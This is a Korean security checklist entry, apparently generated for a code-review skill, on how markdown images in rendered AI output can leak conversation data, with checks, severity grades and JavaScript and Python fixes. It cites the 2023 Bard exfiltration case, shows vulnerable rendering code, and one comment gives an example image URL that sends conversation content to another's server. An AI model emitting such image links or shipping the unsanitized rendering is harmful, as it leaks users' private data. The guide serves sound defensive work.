<!-- 생성 파일: issues/ 원본을 고치세요 -->
# WS-PI-002 데이터 엑스필트레이션(Data Exfiltration) — 마크다운 이미지로 새는 정보

위험 · LLM LLM01 · LLM LLM02 · LLM LLM10 · ASVS V1.3.5 · ASVS V3.4.3 · CWE-200

## 체크 항목

- AI 출력을 HTML로 그리기 전에 새니타이저를 거친다. 이미지 `src`는 내가 운영하는 도메인만 남기고, `srcset`·`style` 속성은 받지 않는다.
- 남이 내용을 올릴 수 있는 도메인(공개 스크립트·파일 공유 서비스)은 이미지 허용 목록에 넣지 않는다. 2023년 Bard 사례에서는 허용돼 있던 구글 도메인을 거쳐 데이터가 나갔다.
- CSP `img-src`를 `'self'`와 꼭 필요한 도메인으로 좁혀 두 번째 방어선으로 둔다.
- 링크에는 `rel="noopener noreferrer"`를 붙이고, 주소에 대화 내용·토큰이 붙어 나가지 않는지 본다.
- 비공개 데이터, 남이 쓴 글, 밖으로 나가는 통로가 한 기능에 모이면(lethal trifecta) 통로부터 끊는다.

## 스킬이 잡는 방식

**찾는 곳**: AI 출력을 그리는 곳(`marked(`, `markdown-it`, `react-markdown`, `markdown.markdown(`, `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `|safe`)과 CSP 설정.

**검사 1. 외부 이미지가 저절로 뜬다**
- 지적할 때: AI 출력을 마크다운에서 HTML로 바꾸면서 이미지 `src` 도메인을 거르지 않는다.
- 지적하지 않을 때: 텍스트로만 그린다(`textContent`, 템플릿 자동 이스케이프). 또는 이미지를 아예 허용하지 않거나 도메인 허용 목록 필터가 있다.

**검사 2. 허용 범위가 너무 넓다**
- 지적할 때: 이미지 허용 목록이나 CSP `img-src`에 `*`, `https:`, 남이 글을 올릴 수 있는 도메인이 있다.
- 지적하지 않을 때: 내가 운영하는 도메인이나 이미지 프록시만 있다.

**등급**
- 위험: 비공개 데이터(대화 기록·문서·메일)와 남이 쓴 글이 함께 들어가는 AI 출력에서 외부 이미지가 저절로 뜬다.
- 주의: 외부 이미지가 뜨지만 AI 입력이 사용자 본인 글뿐이다. 또는 CSP `img-src`가 없다.
- 참고: 링크에 `rel` 속성이 없다.

**보고 형식**: `[위험|주의|참고] <id> <파일:줄> — <이유> → <고칠 방법>`

예: `[위험] WS-PI-002 web/chat.js:31 — 메일 요약 답을 marked 로 그대로 그려 외부 이미지가 자동 로딩 → DOMPurify 로 정리하고 img src 를 우리 도메인만 남김, CSP img-src 'self'`

## 코드

### js

✗ 뚫리는 코드

```js
import { marked } from "marked";

// ![x](https://남의서버/?q=<대화 내용>) 도 그대로 이미지로 뜬다
answerEl.innerHTML = marked.parse(aiText);
```

✓ 막는 코드

```js
import { marked } from "marked";
import DOMPurify from "dompurify";

const IMG_HOSTS = new Set([location.host, "img.example.com"]); // 내가 운영하는 곳만
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName !== "IMG") return;
  let host = "";
  try { host = new URL(node.getAttribute("src") ?? "", location.href).host; } catch {}
  if (!IMG_HOSTS.has(host)) node.removeAttribute("src"); // 주소가 없으면 요청도 없다
});
answerEl.innerHTML = DOMPurify.sanitize(marked.parse(aiText), {
  ALLOWED_TAGS: ["p", "br", "strong", "em", "code", "pre", "ul", "ol", "li", "a", "img", "blockquote"],
  ALLOWED_ATTR: ["href", "src", "alt", "title"], // srcset·style 은 받지 않는다
});
// 응답 헤더: Content-Security-Policy: img-src 'self' https://img.example.com
```

### python

✗ 뚫리는 코드

```python
import markdown

def render_answer(ai_text: str) -> str:
    return markdown.markdown(ai_text)  # 템플릿에서 |safe 로 그린다
```

✓ 막는 코드

```python
import markdown
import nh3
from urllib.parse import urlsplit

IMG_HOSTS = {"img.example.com"}  # 내가 운영하는 곳만
TAGS = {"p", "br", "strong", "em", "code", "pre", "ul", "ol", "li", "a", "img", "blockquote"}

def _keep(tag: str, attr: str, value: str) -> str | None:
    if tag == "img" and attr == "src" and urlsplit(value).hostname not in IMG_HOSTS:
        return None  # 주소가 없으면 요청도 없다
    return value

def render_answer(ai_text: str) -> str:
    return nh3.clean(markdown.markdown(ai_text), tags=TAGS,
                     attributes={"a": {"href", "title"}, "img": {"src", "alt"}},
                     url_schemes={"https"}, attribute_filter=_keep)
```
